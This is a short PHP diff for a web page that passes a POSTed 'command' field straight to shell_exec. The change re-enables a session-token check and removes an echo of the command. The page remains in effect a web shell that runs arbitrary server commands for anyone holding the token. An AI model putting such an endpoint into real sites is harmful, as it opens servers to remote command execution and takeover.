@@ -1,17 +1,14 @@
 <?php
 $command = "";
 session_start();
-//if(isset($_POST["command"])){
+if(isset($_POST["command"])){
     $command = $_POST["command"];
-//    if(!empty($command) and $_SESSION["token"] == $_POST["token"]){
+    if(!empty($command) and $_SESSION["token"] == $_POST["token"]){
         $res = shell_exec($command);
-//    }
-//}
+    }
+}
 $token = sha1(rand()."jng42p98weoidjsalv");
 $_SESSION["token"] = $token;
-
-echo $command;
-
 ?>
 <!DOCUTYPE html>
 <html>
